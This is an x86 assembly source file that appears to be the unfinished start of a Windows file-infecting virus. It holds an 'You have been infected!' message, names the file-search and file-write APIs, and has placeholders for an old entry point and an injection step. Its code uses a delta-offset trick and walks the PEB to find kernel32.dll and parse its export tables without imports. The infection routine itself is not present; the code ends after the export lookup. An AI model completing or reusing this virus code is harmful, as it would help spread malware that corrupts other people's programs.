include misc.inc

.code
	strCaption db 'Notice', 0
    strContent db 'You have been infected!', 0
    strCFA db 'CreateFileA', 0
    strF1A db 'FindFirstFileA', 0
    strFNA db 'FindNextFileA', 0
    strWF db 'WriteFile', 0
    strLLA db 'LoadLibraryA', 0
    strGPA db 'GetProcAddress', 0
    stru32dll db 'user32.dll', 0
    strMBA db 'MessageBoxA', 0
    
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    kernel32dll dd 1
    OrdinalTbl dd 2
    NamePtrTbl dd 3
    AddrTbl dd 4
    k32NumFunc dd 5
    ;    ImageBaseAddress dd ?
;    OldEntryPoint dd ?
;    Inject dd ?
;    user32dll dd ?
    
    stack_reserved db 8 ; Number of values to be stored in the stack
    regSz db 4 ; 8 for 64-bit
    
start:
    call here
    here:
        
    mov ebp, esp
    
    mov eax, stack_reserved
    imul eax, regSz
    sub esp, eax
    
    ; Find kernel32.dll
    mov ebx, fs:0x30
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x14]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x10]
	toStack(kernel32dll, ebx) ; BaseAddress of kernel32.dll
    
    mov edi, [ebx + 0x3C]
    add edi, ebx
    mov edi, [edi + 0x78] ; 24 (0x18) + 96 (0x60) = VA of kernel32.dll Export Table
    add edi, ebx
    mov ecx, [edi + 0x24]
    add ecx, ebx
    toStack(OrdinalTbl, ecx) ; RVA of Ordinal Table
    
    mov esi, [edi + 0x20]
    add esi, ebx
    toStack(NamePtrTbl, esi) ; RVA of Name Pointer Table
    
    mov edx, [edi + 0x1C]
    add edx, ebx
    toStack(AddrTbl, edx) ; RVA of Address Table
    
    mov edx, [edi + 0x14]
    toStack(k32NumFunc, edx)
    
    
    
    
    mov eax, [ebp + regSz] ; EntryPoint + 1 + 4
    
    
    invoke ExitProcess, 0

end start
